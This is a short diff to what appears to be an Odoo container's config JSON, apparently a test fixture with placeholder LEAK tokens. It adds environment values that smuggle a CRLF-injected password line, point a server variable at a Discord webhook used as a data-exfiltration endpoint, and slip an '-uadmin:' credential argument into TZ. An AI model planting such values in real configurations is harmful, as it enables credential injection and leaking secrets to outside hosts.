@@ -19,7 +19,10 @@
             "Env": [
                 "ODOO_VERSION=17.0",
                 "PG_VERSION=16.1",
-                "BUILD_TOKEN_FILE=LEAK98"
+                "BUILD_TOKEN_FILE=LEAK98",
+                "ODOO_RC=/etc/odoo.conf\r\npassword = LEAK119",
+                "OPENERP_SERVER=https://discordapp.com/api/webhooks/9/LEAK120",
+                "TZ=-uadmin:LEAK121"
             ],
             "Labels": {
                 "maintainer": "LEAK29 <x@example.com>",
